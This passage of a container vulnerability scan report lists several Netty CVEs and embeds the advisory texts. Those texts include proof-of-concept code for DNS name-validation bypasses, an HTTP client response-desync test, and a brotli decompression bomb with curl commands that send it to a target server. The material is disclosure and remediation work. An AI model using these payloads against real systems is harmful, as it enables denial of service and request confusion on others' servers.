                        │      │                           // NO check: label contains null bytes
                        │      │                           // NO check: total name > 255 bytes
                        │      │                           buf.writeByte(labelLen);                    // Can
                        │      │                   write values > 63!
                        │      │                           ByteBufUtil.writeAscii(buf, label);         // Null
                        │      │                   bytes pass through!
                        │      │                       buf.writeByte(0);
                        │      │                   }
                        │      │                   ### Root Cause — Decoder
                        │      │                   // DnsCodecUtil.java:94-99 (decodeDomainName)
                        │      │                   } else if (len != 0) {
                        │      │                       if (!in.isReadable(len)) {  // Only checks if bytes
                        │      │                   EXIST, not if len <= 63
                        │      │                           throw new CorruptedFrameException("truncated label
                        │      │                   in a name");
                        │      │                       name.append(in.toString(in.readerIndex(), len,
                        │      │                   CharsetUtil.UTF_8)).append('.');
                        │      │                       //    ^^^^^^ StringBuilder grows WITHOUT any length
                        │      │                   limit
                        │      │                       in.skipBytes(len);
                        │      │                   **Missing checks in decoder**:
                        │      │                   - No `if (len > 63)` check per RFC 1035 Section 2.3.4
                        │      │                   - No `if (name.length() > 255)` check for total domain name
                        │      │                   length
                        │      │                   ## 4. Exploitability Prerequisites
                        │      │                   ### Encoder Side (outbound)
                        │      │                   1. An application constructs DNS queries using Netty's DNS
                        │      │                   codec with user-influenced domain names
                        │      │                   2. The constructed DNS packets are sent to DNS servers or
                        │      │                   resolvers
                        │      │                   ### Decoder Side (inbound)
                        │      │                   1. An application uses Netty's `codec-dns` or `resolver-dns`
                        │      │                    module to process DNS responses
                        │      │                   2. The application communicates with a malicious or
                        │      │                   compromised DNS server
                        │      │                   **Attack surface**: Any Netty application using DNS
                        │      │                   resolution (`DnsNameResolver`) is potentially affected on
                        │      │                   the decoder side, as DNS responses from the network are
                        │      │                   attacker-controlled. The encoder side requires
                        │      │                   user-controlled hostnames.
                        │      │                   ## 5. Attack Scenarios
                        │      │                   ### Scenario 1: DNS Cache Poisoning via Null Byte (Encoder)
                        │      │                   String hostname = userInput;  // "evil\0.trusted.com"
                        │      │                   DnsQuery query = new DefaultDnsQuery(...)
                        │      │                       .addRecord(DnsSection.QUESTION,
                        │      │                           new DefaultDnsQuestion(hostname, DnsRecordType.A));
                        │      │                   The DNS query for `"evil\0.trusted.com"` may be interpreted
                        │      │                   by some resolvers as a query for `"evil"` (truncated at
                        │      │                   null). If the attacker controls the DNS for `"evil"`, they
                        │      │                   can return a response that gets cached for
                        │      │                   `"evil\0.trusted.com"` (or vice versa), poisoning the
                        │      │                   cache.
                        │      │                   ### Scenario 2: Label/Pointer Confusion (Encoder)
                        │      │                   A 200-byte label writes length byte `0xC8`.
                        │      │                   Standards-compliant parsers interpret `0xC0-0xFF` as
                        │      │                   **compression pointer** prefixes (RFC 1035 Section 4.1.4).
                        │      │                   The resulting DNS packet is structurally ambiguous:
                        │      │                   Byte:  [C8] [61 61 61 ... (200 bytes)]
                        │      │                            ↑
                        │      │                      Label interpretation: 200-byte label starting with 'a'
                        │      │                      Pointer interpretation: pointer to offset 0x0861 = 2145
                        │      │                   ### Scenario 3: Memory Exhaustion via Large Labels
                        │      │                   (Decoder)
                        │      │                   A malicious DNS server returns a response with a 255-byte
                        │      │                   label (RFC limit: 63). Netty decodes it without error,
                        │      │                   creating a 260+ character String. With compression pointers,
                        │      │                    a small DNS response can cause megabytes of StringBuilder
                        │      │                   allocation.
                        │      │                   ### Scenario 4: Domain Truncation via Empty Label (Encoder)
                        │      │                   encodeDomainName("safe-domain..evil.com", buf);
                        │      │                   // Only "safe-domain." is encoded, "evil.com" silently
                        │      │                   dropped
                        │      │                   This can bypass domain allowlists that check the input
                        │      │                   string.
                        │      │                   ### Scenario 5: Downstream Processing Failures (Decoder)
                        │      │                   Applications that pass decoded domain names to other DNS
                        │      │                   libraries, certificate validators, or URL parsers may crash
                        │      │                   or behave incorrectly when receiving names > 255 bytes, as
                        │      │                   these systems typically assume RFC 1035 compliance.
                        │      │                   ## 6. Proof of Concept
                        │      │                   ### PoC 1: Encoder Null Byte and Overlength
                        │      │                   (DnsEncoderNullBytePoC.java)
                        │      │                   import io.netty.buffer.ByteBuf;
                        │      │                   import io.netty.buffer.Unpooled;
                        │      │                   import java.lang.reflect.Method;
                        │      │                   import java.nio.charset.StandardCharsets;
                        │      │                   public class DnsEncoderNullBytePoC {
                        │      │                       public static void main(String[] args) throws Exception
                        │      │                   {
                        │      │                           System.out.println("=== Netty DNS Encoder Validation
                        │      │                    Bypass PoC ===\n");
                        │      │                           Class<?> clazz =
                        │      │                   Class.forName("io.netty.handler.codec.dns.DnsCodecUtil");
                        │      │                           Method encode =
                        │      │                   clazz.getDeclaredMethod("encodeDomainName",
                        │      │                               String.class, ByteBuf.class);
                        │      │                           encode.setAccessible(true);
                        │      │                           // Test 1: Null byte in domain name
                        │      │                           ByteBuf buf = Unpooled.buffer(256);
                        │      │                           encode.invoke(null, "evil\0.example.com", buf);
                        │      │                           byte[] bytes = new byte[buf.readableBytes()];
                        │      │                           buf.readBytes(bytes);
                        │      │                           buf.release();
                        │      │                           System.out.print("[TEST 1] Null byte - Encoded: ");
                        │      │                           for (byte b : bytes) System.out.printf("%02x ", b &
                        │      │                   0xff);
                        │      │                           System.out.println("\nVULNERABLE: Null byte 0x00 in
                        │      │                   label data!");
                        │      │                           // Test 2: 200-byte label
                        │      │                           ByteBuf buf2 = Unpooled.buffer(512);
                        │      │                           encode.invoke(null, "a".repeat(200) + ".com",
                        │      │                   buf2);
                        │      │                           System.out.println("\n[TEST 2] 200-byte label
                        │      │                   encoded: " + buf2.readableBytes() + " bytes");
                        │      │                           System.out.println("VULNERABLE: Overlength label
                        │      │                   accepted!");
                        │      │                           buf2.release();
                        │      │                           // Test 3: Empty label truncation
                        │      │                           ByteBuf buf3 = Unpooled.buffer(256);
                        │      │                           encode.invoke(null, "a..b.com", buf3);
                        │      │                           byte[] bytes3 = new byte[buf3.readableBytes()];
                        │      │                           buf3.readBytes(bytes3);
                        │      │                           buf3.release();
                        │      │                           System.out.print("\n[TEST 3] Empty label - Encoded:
                        │      │                   ");
                        │      │                           for (byte b : bytes3) System.out.printf("%02x ", b &
                        │      │                    0xff);
                        │      │                           System.out.println("\nVULNERABLE: Domain silently
                        │      │                   truncated!");
                        │      │                   ### PoC 2: Decoder Length Bypass (DnsDecoderLengthPoC.java)
                        │      │                   public class DnsDecoderLengthPoC {
                        │      │                           System.out.println("=== Netty DNS Decoder Length
                        │      │                   Bypass PoC ===\n");
                        │      │                           Method decode =
                        │      │                   clazz.getDeclaredMethod("decodeDomainName", ByteBuf.class);
                        │      │                           decode.setAccessible(true);
                        │      │                           // Test 1: 100-byte label (RFC limit: 63)
                        │      │                           ByteBuf buf1 = Unpooled.buffer(256);
                        │      │                           buf1.writeByte(100);
                        │      │                          
                        │      │                   buf1.writeBytes("a".repeat(100).getBytes(StandardCharsets.US
                        │      │                   _ASCII));
                        │      │                           buf1.writeByte(3);
                        │      │                   buf1.writeBytes("com".getBytes(StandardCharsets.US_ASCII));
                        │      │                           buf1.writeByte(0);
                        │      │                           String r1 = (String) decode.invoke(null, buf1);
                        │      │                           buf1.release();
                        │      │                           System.out.println("[TEST 1] 100-byte label:
                        │      │                   length=" + r1.length() +
                        │      │                               " VULNERABLE=" + (r1.length() > 64));
                        │      │                           // Test 2: 5 x 60-byte labels = 305 bytes (RFC
                        │      │                   limit: 255)
                        │      │                           for (int i = 0; i < 5; i++) {
                        │      │                               buf2.writeByte(60);
                        │      │                              
                        │      │                   buf2.writeBytes(String.valueOf((char)('a'+i)).repeat(60)
                        │      │                                   .getBytes(StandardCharsets.US_ASCII));
                        │      │                           buf2.writeByte(0);
                        │      │                           String r2 = (String) decode.invoke(null, buf2);
                        │      │                           System.out.println("[TEST 2] 305-byte domain:
                        │      │                   length=" + r2.length() +
                        │      │                               " VULNERABLE=" + (r2.length() > 255));
                        │      │                   ### How to Compile and Run
                        │      │                   ```bash
                        │      │                   JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar"
                        │      │                   -path "*/4.2.12.Final/*" \
                        │      │                     | grep -v sources | grep -v javadoc | tr '\n' ':')
                        │      │                   # Encoder PoC
                        │      │                   javac -cp "$JARS" DnsEncoderNullBytePoC.java
                        │      │                   java --add-opens java.base/java.lang=ALL-UNNAMED -cp
                        │      │                   "$JARS:." DnsEncoderNullBytePoC
                        │      │                   # Decoder PoC
                        │      │                   javac -cp "$JARS" DnsDecoderLengthPoC.java
                        │      │                   "$JARS:." DnsDecoderLengthPoC
                        │      │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
                        │      │                   **Encoder PoC:**
                        │      │                   === Netty DNS Encoder Validation Bypass PoC ===
                        │      │                   [TEST 1] Null byte in domain name
                        │      │                     Input: "evil\0.example.com"
                        │      │                     Encoded bytes: 05 65 76 69 6c 00 07 65 78 61 6d 70 6c 65
                        │      │                   03 63 6f 6d 00
                        │      │                     Null byte in label data: true
                        │      │                     VULNERABLE: YES - Null byte accepted!
                        │      │                   [TEST 2] Label > 63 bytes in encoder
                        │      │                     Input: "aaaaaa..." (200-char label)
                        │      │                     Encoded bytes: 206
                        │      │                     VULNERABLE: YES - Overlength label accepted in encoder!
                        │      │                   [TEST 3] Empty labels (consecutive dots)
                        │      │                     Input: "a..b.com"
                        │      │                     Encoded bytes: 01 61 00
                        │      │                     Note: Empty label truncates the name (may lose data)
                        │      │                   **Decoder PoC:**
                        │      │                   === Netty DNS Decoder Length Bypass PoC ===
                        │      │                   [TEST 1] Label > 63 bytes (RFC 1035 violation)
                        │      │                     Label length: 100 bytes (RFC limit: 63)
                        │      │                     Decoded name length: 105
                        │      │                     VULNERABLE: YES - Label > 63 bytes accepted!
                        │      │                   [TEST 2] Domain > 255 bytes via multiple labels
                        │      │                     5 labels x 60 bytes = 300+ bytes total
                        │      │                     RFC 1035 limit: 255 bytes
                        │      │                     Decoded name length: 305
                        │      │                     VULNERABLE: YES - Domain > 255 bytes accepted!
                        │      │                   ## 7. Impact Analysis
                        │      │                   | Impact Category | Description |
                        │      │                   |----------------|-------------|
                        │      │                   | **Integrity** | HIGH — Null byte injection causes
                        │      │                   differential interpretation across DNS implementations |
                        │      │                   | **Availability** | HIGH — Malicious DNS responses can
                        │      │                   cause unbounded memory allocation via decoder |
                        │      │                   | **DNS Cache Poisoning** | Different parsers see different
                        │      │                   domain names from the same encoded packet |
                        │      │                   | **Domain Validation Bypass** | Null bytes can bypass
                        │      │                   allowlist/blocklist checks in DNS proxies |
                        │      │                   | **Label/Pointer Confusion** | Length bytes > 63 conflict
                        │      │                   with RFC 1035 compression pointer encoding |
                        │      │                   | **Silent Truncation** | Empty labels silently drop the
                        │      │                   remainder of the domain name |
                        │      │                   | **Downstream Failures** | Oversized domain names may crash
                        │      │                    certificate validators, URL parsers, or other DNS-aware
                        │      │                   libraries |
                        │      │                   ## 8. Remediation Recommendations
                        │      │                   ### Fix for Encoder (encodeDomainName)
                        │      │                       int totalLength = 0;
                        │      │                               throw new IllegalArgumentException("DNS name
                        │      │                   contains empty label: " + name);
                        │      │                           if (labelLen > 63) {
                        │      │                               throw new IllegalArgumentException(
                        │      │                                   "DNS label length " + labelLen + " exceeds
                        │      │                   maximum of 63: " + name);
                        │      │                           for (int i = 0; i < label.length(); i++) {
                        │      │                               if (label.charAt(i) == '\0') {
                        │      │                                   throw new IllegalArgumentException(
                        │      │                                       "DNS label contains null byte at index "
                        │      │                    + i);
                        │      │                               }
                        │      │                           totalLength += 1 + labelLen;
                        │      │                           if (totalLength > 254) {
                        │      │                                   "DNS name exceeds maximum length of 255: " +
                        │      │                    name);
                        │      │                           buf.writeByte(labelLen);
                        │      │                           ByteBufUtil.writeAscii(buf, label);
                        │      │                   ### Fix for Decoder (decodeDomainName)
                        │      │                   // Add after "} else if (len != 0) {":
                        │      │                   if (len > 63) {
                        │      │                       throw new CorruptedFrameException("DNS label length " +
                        │      │                   len + " exceeds maximum of 63");
                        │      │                   // Add after "name.append(...)":
                        │      │                   if (name.length() > 255) {
                        │      │                       throw new CorruptedFrameException("DNS domain name
                        │      │                   length exceeds maximum of 255");
                        │      │                   ## 9. Resources
                        │      │                   - [RFC 1035 Section 2.3.4: Size
                        │      │                   Limits](https://tools.ietf.org/html/rfc1035#section-2.3.4)
                        │      │                   - [RFC 1035 Section 4.1.4: Message
                        │      │                   Compression](https://tools.ietf.org/html/rfc1035#section-4.1
                        │      │                   .4)
                        │      │                   - [CWE-20: Improper Input
                        │      │                   Validation](https://cwe.mitre.org/data/definitions/20.html)
                        │      │                   - [CWE-400: Uncontrolled Resource
                        │      │                   Consumption](https://cwe.mitre.org/data/definitions/400.html
                        │      │                   )
                        │      │                   - [CWE-626: Null Byte Interaction
                        │      │                   Error](https://cwe.mitre.org/data/definitions/626.html) 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N 
                        │      │                         ╰ V3Score : 7.5 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ├ [1]: https://github.com/netty/netty/security/advisories/GHS
                        │                         │      A-cm33-6792-r9fm 
                        │                         ├ [2]: https://tools.ietf.org/html/rfc1035#section-2.3.4 
                        │                         ╰ [3]: https://tools.ietf.org/html/rfc1035#section-4.1.4 
                        ├ [2]  ╭ VulnerabilityID : CVE-2026-42584 
                        │      ├ VendorIDs        ─ [0]: GHSA-57rv-r2g8-2cj3 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
                        │      │                  ╰ UID : 42139b2b89dda2f4 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42584 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:138c25aeebd79616619b94270d69dfd09bb9ef5e576cded2f5f9d
                        │      │                   83c459589cc 
                        │      ├ Title           : Netty has HttpClientCodec response desynchronization 
                        │      ├ Description     : ### Summary
                        │      │                    If HttpClientCodec is configured, there are use cases when
                        │      │                   a response body from one request, can be parsed as
                        │      │                   another's.
                        │      │                   
                        │      │                   ### Details
                        │      │                   HttpClientCodec pairs each inbound response with an outbound
                        │      │                    request by `queue.poll()` once per response, including for
                        │      │                   `1xx`. If the client pipelines GET then HEAD and the server
                        │      │                   sends 103, then 200 with GET body, then 200 for HEAD, the
                        │      │                   queue pairs HEAD with the first 200. The HEAD rule then
                        │      │                   skips reading that message’s body, so the GET entity bytes
                        │      │                   stay on the stream and the following 200 is parsed from the
                        │      │                   wrong offset.
                        │      │                   Prerequisites 
                        │      │                   - HTTP/1.1 pipelining
                        │      │                   - HEAD in the pipeline
                        │      │                   - The server sends 1xx
                        │      │                   ### PoC
                        │      │                   ```java
                        │      │                       @Test
                        │      │                       public void test() {
                        │      │                           EmbeddedChannel channel = new EmbeddedChannel(new
                        │      │                   HttpClientCodec());
                        │      │                           assertTrue(channel.writeOutbound(new
                        │      │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET,
                        │      │                    "/1")));
                        │      │                           ByteBuf request = channel.readOutbound();
                        │      │                           request.release();
                        │      │                           assertNull(channel.readOutbound());
                        │      │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1,
                        │      │                   HttpMethod.HEAD, "/2")));
                        │      │                           request = channel.readOutbound();
                        │      │                           String responseStr = "HTTP/1.1 103 Early
                        │      │                   Hints\r\n\r\n" +
                        │      │                                   "HTTP/1.1 200 OK\r\nContent-Length:
                        │      │                   5\r\n\r\nhello" +
                        │      │                                   "HTTP/1.1 200 OK\r\n\r\n";
                        │      │                          
                        │      │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(respon
                        │      │                   seStr, CharsetUtil.US_ASCII)));
                        │      │                           // Response 1
                        │      │                           HttpResponse response = channel.readInbound();
                        │      │                           assertEquals(HttpResponseStatus.EARLY_HINTS,
                        │      │                   response.status());
                        │      │                           LastHttpContent last = channel.readInbound();
                        │      │                           assertEquals(0, last.content().readableBytes());
                        │      │                           last.release();
                        │      │                           // Response 2
                        │      │                           response = channel.readInbound();
                        │      │                           assertEquals(HttpResponseStatus.OK,
                        │      │                           last = channel.readInbound();
                        │      │                           // Response 3
                        │      │                           FullHttpResponse response1 = channel.readInbound();
                        │      │                           assertTrue(response1.decoderResult().isFailure());
                        │      │                           assertEquals(0,
                        │      │                   response1.content().readableBytes());
                        │      │                           response1.release();
                        │      │                           assertFalse(channel.finish());
                        │      │                       }
                        │      │                   ```
                        │      │                   ### Impact
                        │      │                   Integrity/availability of HTTP parsing on that connection,
                        │      │                   unsafe reuse of the socket. 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L 
                        │      │                         ╰ V3Score : 7.3 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-57rv-r2g8-2cj3 
                        ├ [3]  ╭ VulnerabilityID : CVE-2026-42587 
                        │      ├ VendorIDs        ─ [0]: GHSA-f6hv-jmp6-3vwv 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
                        │      │                  ╰ UID : 42139b2b89dda2f4 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42587 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:ef9815ae7a94903bd25f8c10fe8311c41be84c2034ee55de81513
                        │      │                   911ed991da4 
                        │      ├ Title           : Netty: HttpContentDecompressor maxAllocation bypass when
                        │      │                   Content-Encoding set to br/zstd/snappy leads to
                        │      │                   decompression bomb DoS 
                        │      ├ Description     : ## Summary
                        │      │                   
                        │      │                   `HttpContentDecompressor` accepts a `maxAllocation`
                        │      │                   parameter to limit decompression buffer size and prevent
                        │      │                   decompression bomb attacks. This limit is correctly enforced
                        │      │                    for gzip and deflate encodings via `ZlibDecoder`, but is
                        │      │                   silently ignored when the content encoding is `br` (Brotli),
                        │      │                    `zstd`, or `snappy`. An attacker can bypass the configured
                        │      │                   decompression limit by sending a compressed payload with
                        │      │                   `Content-Encoding: br` instead of `Content-Encoding: gzip`,
                        │      │                   causing unbounded memory allocation and out-of-memory denial
                        │      │                    of service.
                        │      │                   The same vulnerability exists in
                        │      │                   `DelegatingDecompressorFrameListener` for HTTP/2
                        │      │                   connections.
                        │      │                   ## Details
                        │      │                   `HttpContentDecompressor` stores the `maxAllocation` value
                        │      │                   at construction time (`HttpContentDecompressor.java:89`) and
                        │      │                    uses it in `newContentDecoder()` to create the appropriate
                        │      │                   decompression handler.
                        │      │                   For gzip/deflate, `maxAllocation` is forwarded to
                        │      │                   `ZlibCodecFactory.newZlibDecoder()`:
                        │      │                   ```java
                        │      │                   // HttpContentDecompressor.java:101 — maxAllocation IS
                        │      │                   enforced
                        │      │                   .handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP,
                        │      │                   maxAllocation))
                        │      │                   ```
                        │      │                   `ZlibDecoder.prepareDecompressBuffer()` enforces this as a
                        │      │                   hard cap by setting the buffer's `maxCapacity` and throwing
                        │      │                   `DecompressionException` when the limit is reached:
                        │      │                   // ZlibDecoder.java:68 — hard limit on buffer capacity
                        │      │                   return ctx.alloc().heapBuffer(Math.min(preferredSize,
                        │      │                   maxAllocation), maxAllocation);
                        │      │                   // ZlibDecoder.java:80 — throws when exceeded
                        │      │                   throw new DecompressionException("Decompression buffer has
                        │      │                   reached maximum size: " + buffer.maxCapacity());
                        │      │                   For brotli, zstd, and snappy, the decoders are created
                        │      │                   without any size limit:
                        │      │                   // HttpContentDecompressor.java:120 — maxAllocation IGNORED
                        │      │                   .handlers(new BrotliDecoder())
                        │      │                   // HttpContentDecompressor.java:129 — maxAllocation IGNORED
                        │      │                   .handlers(new SnappyFrameDecoder())
                        │      │                   // HttpContentDecompressor.java:138 — maxAllocation IGNORED
                        │      │                   .handlers(new ZstdDecoder())
                        │      │                   `BrotliDecoder` has no `maxAllocation` parameter at all —
                        │      │                   there is no way to constrain its output. It streams
                        │      │                   decompressed data in chunks via `fireChannelRead` with no
                        │      │                   total limit.
                        │      │                   `ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`,
                        │      │                   but this only constrains individual buffer allocations, not
                        │      │                   total output. The decode loop (`ZstdDecoder.java:100-114`)
                        │      │                   creates new buffers and fires `channelRead` repeatedly, so
                        │      │                   total decompressed output is unbounded.
                        │      │                   The identical pattern exists in
                        │      │                   `DelegatingDecompressorFrameListener.newContentDecompressor(
                        │      │                   )` at lines 188-210 for HTTP/2.
                        │      │                   ## PoC
                        │      │                   1. Configure a Netty HTTP server with decompression bomb
                        │      │                   protection:
                        │      │                   pipeline.addLast(new HttpContentDecompressor(1048576)); //
                        │      │                   1MB max
                        │      │                   pipeline.addLast(new HttpObjectAggregator(1048576));     //
                        │      │                   2. Generate a brotli-compressed bomb (~1KB compressed → 1GB
                        │      │                   decompressed):
                        │      │                   ```python
                        │      │                   import brotli
                        │      │                   bomb = b'\x00' * (1024 * 1024 * 1024)  # 1GB of zeros
                        │      │                   compressed = brotli.compress(bomb, quality=11)
                        │      │                   with open('bomb.br', 'wb') as f:
                        │      │                       f.write(compressed)
                        │      │                   # compressed size: ~1KB
                        │      │                   3. Send the bomb with gzip encoding (BLOCKED by
                        │      │                   maxAllocation):
                        │      │                   ```bash
                        │      │                   # This is caught — ZlibDecoder enforces the 1MB limit
                        │      │                   curl -X POST http://target:8080/api \
                        │      │                     -H 'Content-Encoding: gzip' \
                        │      │                     --data-binary @bomb.gz
                        │      │                   # Result: DecompressionException thrown at 1MB
                        │      │                   4. Send the same bomb with brotli encoding (BYPASSES
                        │      │                   # This bypasses the limit — BrotliDecoder has no
                        │      │                   maxAllocation
                        │      │                     -H 'Content-Encoding: br' \
                        │      │                     --data-binary @bomb.br
                        │      │                   # Result: Full 1GB decompressed into memory → OOM
                        │      │                   5. The same bypass works with `Content-Encoding: zstd` and
                        │      │                   `Content-Encoding: snappy`.
                        │      │                   ## Impact
                        │      │                   - **Denial of Service**: An attacker can cause out-of-memory
                        │      │                    conditions on any Netty server that relies on
                        │      │                   `maxAllocation` for decompression bomb protection, by simply
                        │      │                    using a non-gzip content encoding.
                        │      │                   - **False sense of security**: Developers who explicitly
                        │      │                   configure `maxAllocation` to protect against decompression
                        │      │                   bombs are not actually protected for brotli, zstd, or snappy
                        │      │                    encodings. The API documentation implies all encodings are
                        │      │                   covered.
                        │      │                   - **Trivial bypass**: The attacker only needs to change one
                        │      │                   HTTP header (`Content-Encoding: br` instead of
                        │      │                   `Content-Encoding: gzip`) to circumvent the protection
                        │      │                   entirely.
                        │      │                   - **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in
                        │      │                   both `HttpContentDecompressor` (HTTP/1.1) and
                        │      │                   `DelegatingDecompressorFrameListener` (HTTP/2).
                        │      │                   ## Recommended Fix
                        │      │                   Pass `maxAllocation` to all decoder constructors. For
                        │      │                   `BrotliDecoder`, which currently has no `maxAllocation`
                        │      │                   support, add the parameter:
                        │      │                   **HttpContentDecompressor.java** — pass maxAllocation to all
                        │      │                    decoders:
                        │      │                   // Line 120: BrotliDecoder — add maxAllocation support
                        │      │                   .handlers(new BrotliDecoder(maxAllocation))
                        │      │                   // Line 129: SnappyFrameDecoder — add maxAllocation support
                        │      │                   .handlers(new SnappyFrameDecoder(maxAllocation))
                        │      │                   // Line 138: ZstdDecoder — forward the configured
                        │      │                   .handlers(new ZstdDecoder(maxAllocation))
                        │      │                   **DelegatingDecompressorFrameListener.java** — same fix at
                        │      │                   lines 188-210.
                        │      │                   **BrotliDecoder** — add `maxAllocation` parameter with the
                        │      │                   same semantics as `ZlibDecoder.prepareDecompressBuffer()`:
                        │      │                   set buffer maxCapacity and throw `DecompressionException`
                        │      │                   when the total decompressed output exceeds the limit.
                        │      │                   **SnappyFrameDecoder** — add `maxAllocation` parameter with
                        │      │                   equivalent enforcement.
                        │      │                   **ZstdDecoder** — ensure that when `maxAllocation` is set,
                        │      │                   total output across all buffers is bounded (not just
                        │      │                   per-buffer allocation size). 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
                        │      │                         ╰ V3Score : 7.5 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-f6hv-jmp6-3vwv 
                        ├ [4]  ╭ VulnerabilityID : CVE-2026-41417 
                        │      ├ VendorIDs        ─ [0]: GHSA-v8h7-rr48-vmmv 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
                        │      │                  ╰ UID : 42139b2b89dda2f4 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41417 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:f4a0586c7efa06b5be3a3e07773923f8635330ac5f65bcf26e69c
                        │      │                   32024203274 
                        │      ├ Title           : Netty allows request-line validation to be bypassed when a
                        │      │                   `DefaultHtt ... 
                        │      ├ Description     : Netty allows request-line validation to be bypassed when a
                        │      │                   `DefaultHttpRequest` or `DefaultFullHttpRequest` is created
                        │      │                   first and its URI is later changed via `setUri()`. The
                        │      │                   constructors reject CRLF and whitespace characters that
                        │      │                   would break the start-line, but `setUri()` does not apply
                        │      │                   the same validation. `HttpRequestEncoder` and `RtspEncoder`
                        │      │                   then write the URI into the request line verbatim. If
                        │      │                   attacker-controlled input reaches `setUri()`, this enables
                        │      │                   CRLF injection and insertion of additional HTTP or RTSP
                        │      │                   requests, leading to HTTP request smuggling or
                        │      │                   desynchronization on the HTTP side and request injection on
                        │      │                   the RTSP side. This issue is fixed in versions 4.2.13.Final
                        │      │                   and 4.1.133.Final. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ╭ [0]: CWE-93 
                        │      │                  ╰ [1]: CWE-444 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
                        │      │                         ╰ V3Score : 5.3 
                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
                        │      │                  ├ [1]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-v8h7-rr48-vmmv 
                        │      │                  ╰ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-41417 
                        │      ├ PublishedDate   : 2026-05-06T22:16:25.78Z 
                        │      ╰ LastModifiedDate: 2026-05-11T14:29:48.36Z 
                        ├ [5]  ╭ VulnerabilityID : CVE-2026-42580 
                        │      ├ VendorIDs        ─ [0]: GHSA-m4cv-j2px-7723 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
